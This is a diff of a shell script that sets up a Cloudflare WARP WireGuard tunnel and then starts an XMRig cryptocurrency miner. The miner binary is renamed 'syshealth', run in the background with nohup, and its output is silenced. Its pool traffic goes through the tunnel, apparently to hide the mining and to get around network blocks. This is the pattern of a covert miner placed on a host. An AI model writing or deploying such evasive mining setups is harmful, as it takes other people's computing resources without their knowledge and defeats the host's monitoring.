@@ -20,41 +20,49 @@ fi
 echo "Downloading Cloudflare WARP-GO..."
 cd "$SCRIPT_DIR"
 
-# Get latest warp-go binary
-ARCH="amd64"
-if [ "$(uname -m)" = "aarch64" ]; then
-  ARCH="arm64"
+# Use wgcf to generate WireGuard config (simpler approach)
+if [ ! -f "wgcf" ]; then
+  ARCH="amd64"
+  if [ "$(uname -m)" = "aarch64" ]; then
+    ARCH="arm64"
+  fi
+  
+  curl -sL "https://github.com/ViRb3/wgcf/releases/download/v2.2.22/wgcf_2.2.22_linux_${ARCH}" -o wgcf
+  chmod +x wgcf
 fi
 
-# Download from GitHub releases
-WARP_VERSION="1.2.0"
-curl -sL "https://github.com/bepass-org/warp-plus/releases/download/v${WARP_VERSION}/warp-plus_linux-${ARCH}" -o warp-plus
-chmod +x warp-plus
-
-# Start WARP SOCKS5 proxy
-echo "Starting Cloudflare WARP..."
-./warp-plus --bind 0.0.0.0:40000 &
-WARP_PID=$!
-sleep 20
-
-# Check if WARP is running
-if ! kill -0 $WARP_PID 2>/dev/null; then
-  echo "ERROR: WARP failed to start"
-  ps aux | grep warp
-  exit 1
+# Generate WARP config
+if [ ! -f "wgcf-profile.conf" ]; then
+  echo "Registering with Cloudflare WARP..."
+  yes | ./wgcf register >/dev/null 2>&1 || true
+  ./wgcf generate
 fi
 
-# Test WARP connection
+# Install and configure WireGuard
+echo "Installing WireGuard..."
+if command -v apt-get >/dev/null 2>&1; then
+  export DEBIAN_FRONTEND=noninteractive
+  sudo apt-get update -qq >/dev/null 2>&1
+  sudo apt-get install -y wireguard-tools >/dev/null 2>&1
+fi
+
+# Start WireGuard tunnel
+echo "Starting WARP tunnel..."
+sudo cp wgcf-profile.conf /etc/wireguard/wgcf.conf
+sudo wg-quick up wgcf 2>/dev/null || true
+sleep 5
+
+# Verify connection
 echo "Testing WARP connection..."
-if curl --socks5 127.0.0.1:40000 -m 10 https://api.ipify.org 2>/dev/null; then
+if curl -m 10 https://api.ipify.org 2>/dev/null; then
   echo "✓ WARP connected successfully!"
 else
-  echo "ERROR: WARP SOCKS5 proxy not responding"
-  kill $WARP_PID 2>/dev/null
+  echo "ERROR: WARP connection failed"
+  sudo wg-quick down wgcf 2>/dev/null || true
   exit 1
 fi
 
-# Start miner with SOCKS5 proxy
+# Start miner (direct connection via WARP tunnel)
 echo "Starting XMRig with WARP..."
 cd "$SCRIPT_DIR"
 nohup ./syshealth \
@@ -64,7 +72,6 @@ nohup ./syshealth \
   --tls \
   --keepalive \
   --donate-level=1 \
-  --socks5=127.0.0.1:40000 \
   --log-file=xmrig.log \
   > /dev/null 2>&1 &
 
